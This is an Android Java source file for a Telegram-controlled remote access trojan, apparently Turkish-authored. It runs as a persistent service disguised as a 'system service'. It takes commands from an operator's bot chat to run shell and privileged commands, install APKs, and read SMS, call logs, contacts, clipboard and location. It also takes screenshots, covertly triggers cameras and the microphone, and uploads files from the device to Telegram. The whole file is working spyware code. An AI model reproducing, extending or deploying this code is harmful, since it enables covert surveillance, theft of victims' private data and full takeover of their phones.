package com.java.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.Scanner;

public class ShellService extends Service {

    public static ShellService instance;
    private boolean isRunning = true;
    public String BOT_TOKEN = "";
    public String ADMIN_CHAT_ID = "";
    private final String TARGET_DIR = "/storage/emulated/0/panel/";
    private long lastUpdateId = 0;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        File dir = new File(TARGET_DIR);
        if (!dir.exists()) dir.mkdirs();
        loadConfig();
    }

    private void loadConfig() {
        try {
            InputStream is = getAssets().open("config.txt");
            Scanner scanner = new Scanner(is);
            while (scanner.hasNextLine()) {
                String line = scanner.nextLine().trim();
                if (line.startsWith("BOT_TOKEN=")) BOT_TOKEN = line.substring(10).trim();
                else if (line.startsWith("ADMIN_CHAT_ID=")) ADMIN_CHAT_ID = line.substring(14).trim();
            }
            scanner.close();
            is.close();
        } catch (Exception e) { e.printStackTrace(); }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        Notification notification = new NotificationCompat.Builder(this, "ShellServiceChannel")
                .setContentTitle("Sistem Servisi Aktif")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
        startForeground(1, notification);

        new Thread(() -> {
            while (isRunning) {
                checkTelegramUpdates();
                try { Thread.sleep(3000); } catch (InterruptedException e) { e.printStackTrace(); }
            }
        }).start();
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("ShellServiceChannel", "Shell Service", NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }
    }

    private void checkTelegramUpdates() {
        try {
            if (BOT_TOKEN.isEmpty()) return;
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=2");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            Scanner scanner = new Scanner(conn.getInputStream());
            StringBuilder response = new StringBuilder();
            while (scanner.hasNext()) response.append(scanner.nextLine());
            scanner.close();

            JSONObject jsonObject = new JSONObject(response.toString());
            JSONArray results = jsonObject.optJSONArray("result");
            if (results != null) {
                for (int i = 0; i < results.length(); i++) {
                    JSONObject update = results.getJSONObject(i);
                    lastUpdateId = update.getLong("update_id");
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String chatId = String.valueOf(message.getJSONObject("chat").getLong("id"));
                        if (chatId.equals(ADMIN_CHAT_ID)) {
                            if (message.has("document")) {
                                JSONObject doc = message.getJSONObject("document");
                                String fileId = doc.getString("file_id");
                                String fileName = doc.optString("file_name", "upload_" + System.currentTimeMillis());
                                downloadTelegramFile(fileId, TARGET_DIR + fileName, chatId);
                            } else if (message.has("photo")) {
                                JSONArray photos = message.getJSONArray("photo");
                                JSONObject bestPhoto = photos.getJSONObject(photos.length() - 1);
                                String fileId = bestPhoto.getString("file_id");
                                downloadTelegramFile(fileId, TARGET_DIR + "photo_" + System.currentTimeMillis() + ".jpg", chatId);
                            } else if (message.has("text")) {
                                handleCommand(message.getString("text").trim(), chatId);
                            }
                        }
                    }
                }
            }
        } catch (Exception e) { e.printStackTrace(); }
    }

    private void handleCommand(String text, String chatId) {
        if (text.equals("/help") || text.equals("/yardim")) {
            sendTelegramMessage(chatId, "╭───『 𝐉𝐚𝐯𝐚𝐬𝐮 𝐘𝐚𝐫𝐝𝚤𝐦 𝐌𝐞𝐧ü𝐬ü 』───╮\n\n" +
                    "  ➤ /shell <komut>\n  ➤ /shizuku <komut>\n  ➤ /file <dizin>\n  ➤ /data\n" +
                    "  ➤ /download <yol>\n  ➤ /upload\n  ➤ /apk <yol>\n  ➤ /locate\n" +
                    "  ➤ /screenshot\n  ➤ /cam_front\n  ➤ /cam_back\n  ➤ /microphone\n  ➤ /phone\n" +
                    "  ➤ /open_site <url>\n  ➤ /open_app <pkg>\n  ➤ /sysinfo\n  ➤ /getclip\n" +
                    "  ➤ /setclip <metin>\n  ➤ /sms_send <tel> <msj>\n  ➤ /sms_list\n" +
                    "  ➤ /apps\n  ➤ /kill <paket>\n  ➤ /calls\n  ➤ /find <isim>\n  ➤ /zip <yol>\n\n" +
                    "╰─────────────────────────╯\n@JavaKyoseva");
        }
        else if (text.equals("/sysinfo")) {
            sendTelegramMessage(chatId, SystemInfoHelper.getSystemInfo(this));
        }
        else if (text.equals("/getclip")) {
            new Handler(Looper.getMainLooper()).post(() -> {
                String clip = ClipboardManagerHelper.getClipboardText(this);
                sendTelegramMessage(chatId, clip);
            });
        }
        else if (text.startsWith("/setclip ")) {
            sendTelegramMessage(chatId, ClipboardManagerHelper.setClipboardText(this, text.substring(9)));
        }
        else if (text.startsWith("/sms_send ")) {
            String[] p = text.split(" ", 3);
            if (p.length == 3) sendTelegramMessage(chatId, SmsManagerHelper.sendSms(p[1], p[2]));
            else sendTelegramMessage(chatId, "Kullanım: /sms_send <numara> <mesaj>");
        }
        else if (text.equals("/sms_list")) {
            sendTelegramMessage(chatId, SmsManagerHelper.getRecentSms(this));
        }
        else if (text.equals("/apps")) {
            sendTelegramMessage(chatId, AppManagerHelper.getInstalledApps(this));
        }
        else if (text.startsWith("/kill ")) {
            String pkg = text.substring(6).trim();
            sendTelegramMessage(chatId, AppManagerHelper.killApp(pkg));
        }
        else if (text.equals("/calls")) {
            sendTelegramMessage(chatId, CallLogHelper.getCallLogs(this));
        }
        else if (text.equals("/locate")) {
            Intent intent = new Intent(this, LocationActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendTelegramMessage(chatId, "📍 Konum alınıyor...");
        }
        else if (text.equals("/screenshot")) {
            Intent intent = new Intent(this, ScreenCaptureActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendTelegramMessage(chatId, "📸 Ekran görüntüsü alınıyor...");
        }
        else if (text.startsWith("/find ")) {
            String query = text.substring(6).trim();
            sendTelegramMessage(chatId, FileManagerHelper.findFile(new File("/storage/emulated/0/"), query));
        }
        else if (text.startsWith("/zip ")) {
            String path = text.substring(5).trim();
            sendTelegramMessage(chatId, FileManagerHelper.zipFolder(path, path + ".zip"));
        }
        else if (text.startsWith("/shell ")) {
            String cmd = text.substring(7).trim();
            sendTelegramMessage(chatId, executeShell(cmd));
        }
        else if (text.startsWith("/shizuku ")) {
            String cmd = text.substring(9).trim();
            sendTelegramMessage(chatId, executeShizuku(cmd));
        }
        else if (text.startsWith("/apk ")) {
            String apkPath = text.substring(5).trim();
            sendTelegramMessage(chatId, executeShizuku("pm install -r '" + apkPath + "'"));
        }
        else if (text.startsWith("/download ")) {
            String filePath = text.substring(10).trim();
            sendFileToTelegram(filePath, chatId);
        }
        else if (text.equals("/upload")) {
            sendTelegramMessage(chatId, "📤 Lütfen cihaza göndermek istediğiniz dosyayı veya fotoğrafı doğrudan Telegram üzerinden bota mesaj olarak gönderin.");
        }
        else if (text.startsWith("/file ")) {
            String dirPath = text.substring(6).trim();
            sendTelegramMessage(chatId, FileManagerHelper.listDirectory(dirPath));
        }
        else if (text.equals("/data")) {
            sendTelegramMessage(chatId, FileManagerHelper.listDirectory(TARGET_DIR));
        }
        else if (text.equals("/cam_front")) {
            Intent intent = new Intent(this, CameraActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("cam_id", 1);
            startActivity(intent);
            sendTelegramMessage(chatId, "📸 Ön kamera tetikleniyor...");
        }
        else if (text.equals("/cam_back")) {
            Intent intent = new Intent(this, CameraActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.putExtra("cam_id", 0);
            startActivity(intent);
            sendTelegramMessage(chatId, "📸 Arka kamera tetikleniyor...");
        }
        else if (text.equals("/microphone")) {
            Intent intent = new Intent(this, MicActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            sendTelegramMessage(chatId, "🎤 10 saniyelik ortam ses kaydı başlatıldı...");
        }
        else if (text.equals("/phone")) {
            sendTelegramMessage(chatId, CallLogHelper.getContacts(this));
        }
        else if (text.startsWith("/open_site ")) {
            String siteUrl = text.substring(11).trim();
            try {
                if (!siteUrl.startsWith("http://") && !siteUrl.startsWith("https://")) {
                    siteUrl = "https://" + siteUrl;
                }
                Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(siteUrl));
                browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(browserIntent);
                sendTelegramMessage(chatId, "🌐 Tarayıcıda açıldı: " + siteUrl);
            } catch (Exception e) {
                sendTelegramMessage(chatId, "❌ Tarayıcı açılamadı: " + e.getMessage());
            }
        }
        else if (text.startsWith("/open_app ")) {
            String pkg = text.substring(10).trim();
            try {
                Intent launchIntent = getPackageManager().getLaunchIntentForPackage(pkg);
                if (launchIntent != null) {
                    launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(launchIntent);
                    sendTelegramMessage(chatId, "🚀 Uygulama başlatıldı -> " + pkg);
                } else {
                    sendTelegramMessage(chatId, "❌ Uygulama başlatılamadı (Bulunamadı).");
                }
            } catch (Exception e) {
                sendTelegramMessage(chatId, "❌ Hata: " + e.getMessage());
            }
        }
    }

    private String executeShell(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            while ((line = errorReader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
        } catch (Exception e) {
            return "❌ Shell Hatası: " + e.getMessage();
        }
        return output.length() > 0 ? output.toString() : "✅ Komut başarıyla çalıştırıldı (Çıktı yok).";
    }

    private String executeShizuku(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Class<?> shizukuClass = Class.forName("rikka.shizuku.Shizuku");
            Method newProcessMethod = shizukuClass.getDeclaredMethod("newProcess", String[].class, String[].class, String.class);
            newProcessMethod.setAccessible(true);
            
            Process process = (Process) newProcessMethod.invoke(null, new String[]{"sh", "-c", command}, null, null);
            if (process != null) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                while ((line = errorReader.readLine()) != null) {
                    output.append(line).append("\n");
                }
                process.waitFor();
            }
        } catch (Exception e) {
            return "❌ Shizuku Komut Hatası (Shizuku açık ve izin verilmiş mi?): " + e.getMessage();
        }
        return output.length() > 0 ? output.toString() : "✅ Shizuku komutu başarıyla çalıştırıldı (Çıktı yok).";
    }

    public void sendTelegramMessage(String chatId, String text) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + chatId + "&text=" + URLEncoder.encode(text, "UTF-8");
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.getInputStream().close();
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private void sendFileToTelegram(String filePath, String chatId) {
        new Thread(() -> {
            try {
                File file = new File(filePath);
                if (!file.exists()) {
                    sendTelegramMessage(chatId, "❌ Gönderilecek dosya bulunamadı: " + filePath);
                    return;
                }
                String boundary = "*****";
                String lineEnd = "\r\n";
                String twoHyphens = "--";
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd + lineEnd + chatId + lineEnd);
                
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\"" + file.getName() + "\"" + lineEnd);
                dos.writeBytes("Content-Type: application/octet-stream" + lineEnd + lineEnd);

                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[8192];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    dos.write(buffer, 0, bytesRead);
                }
                fis.close();

                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                dos.flush();
                dos.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    sendTelegramMessage(chatId, "✅ Dosya başarıyla gönderildi: " + file.getName());
                } else {
                    sendTelegramMessage(chatId, "❌ Dosya gönderilemedi. Kod: " + responseCode);
                }
            } catch (Exception e) {
                sendTelegramMessage(chatId, "❌ Dosya gönderme hatası: " + e.getMessage());
            }
        }).start();
    }

    private void downloadTelegramFile(String fileId, String savePath, String chatId) {
        new Thread(() -> {
            try {
                URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getFile?file_id=" + fileId);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                Scanner scanner = new Scanner(conn.getInputStream());
                StringBuilder sb = new StringBuilder();
                while (scanner.hasNext()) sb.append(scanner.nextLine());
                scanner.close();

                JSONObject jsonObj = new JSONObject(sb.toString());
                if (jsonObj.getBoolean("ok")) {
                    String filePath = jsonObj.getJSONObject("result").getString("file_path");
                    String downloadUrl = "https://api.telegram.org/file/bot" + BOT_TOKEN + "/" + filePath;
                    
                    URL fileUrl = new URL(downloadUrl);
                    InputStream in = fileUrl.openStream();
                    FileOutputStream fos = new FileOutputStream(new File(savePath));
                    byte[] buffer = new byte[8192];
                    int n;
                    while ((n = in.read(buffer)) != -1) {
                        fos.write(buffer, 0, n);
                    }
                    fos.close();
                    in.close();
                    sendTelegramMessage(chatId, "📥 Dosya cihaza başarıyla kaydedildi:\n" + savePath);
                }
            } catch (Exception e) {
                sendTelegramMessage(chatId, "❌ Dosya indirme hatası: " + e.getMessage());
            }
        }).start();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
